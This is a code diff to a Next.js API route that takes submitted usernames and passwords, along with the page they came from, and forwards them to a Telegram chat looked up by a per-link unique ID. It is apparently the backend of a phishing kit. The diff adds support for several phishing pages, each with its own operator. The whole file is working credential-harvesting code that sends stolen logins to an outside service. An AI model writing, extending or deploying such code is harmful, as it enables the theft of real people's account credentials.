@@ -1,14 +1,21 @@
-import { NextResponse } from "next/server"
+import { getChatId } from "@/lib/db"
 
 export async function POST(req) {
-  const { username, password, chatId } = await req.json()
+  const { username, password, uniqueId, page } = await req.json()
+  const chatId = await getChatId(uniqueId)
 
-  const message = `Login attempt:
+  if (!chatId) {
+    return new Response("Invalid URL", { status: 400 })
+  }
+
+  const message = `New login attempt:
+Page: ${page}
 Username: ${username}
-Password: ${password}`
+Password: ${password}
+Time: ${new Date().toLocaleString()}`
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -16,15 +23,10 @@ Password: ${password}`
         text: message,
       }),
     })
-
-    if (response.ok) {
-      return NextResponse.json({ success: true })
-    } else {
-      return NextResponse.json({ success: false }, { status: 500 })
-    }
+    return new Response("OK")
   } catch (error) {
-    console.error("Error sending message to Telegram:", error)
-    return NextResponse.json({ success: false }, { status: 500 })
+    console.error("Error sending message:", error)
+    return new Response("Error", { status: 500 })
   }
 }
 
